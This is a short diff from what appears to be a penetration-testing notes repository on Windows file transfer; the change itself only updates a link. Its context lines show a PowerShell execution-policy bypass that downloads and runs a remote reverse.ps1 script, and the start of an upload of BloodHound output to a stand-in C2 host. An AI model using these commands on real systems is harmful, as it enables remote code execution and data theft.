@@ -122,7 +122,7 @@ bitsadmin /create JOB & bitsadmin /addfile JOB %TEMP%\test1.txt %TEMP%\test2.txt
     powershell -Exec Bypass -c "IEX(New-Object System.Net.WebClient).DownloadString(`"""http://10.0.1.5:1337/reverse.ps1`""")"
     ```
 * Uploading files
-    * Setup a [Simple HTTP Server](../Infrastructure_Setup/Simple_Python_Go_Packages.html#projectdiscovery-simplehttpserver) for this command.
+    * Setup a [Simple HTTP Server](../Network/Data_Exfiltration/Windows-Linux-Curl-SimpleHTTPServerwithUpload.md#projectdiscovery-simplehttpserver) for this command.
     ```
     $uri = "https://c2.attacker.com/bh.zip"
     $uploadPath = "C:\Windows\temp\20210101000109_BloodHound.zip"
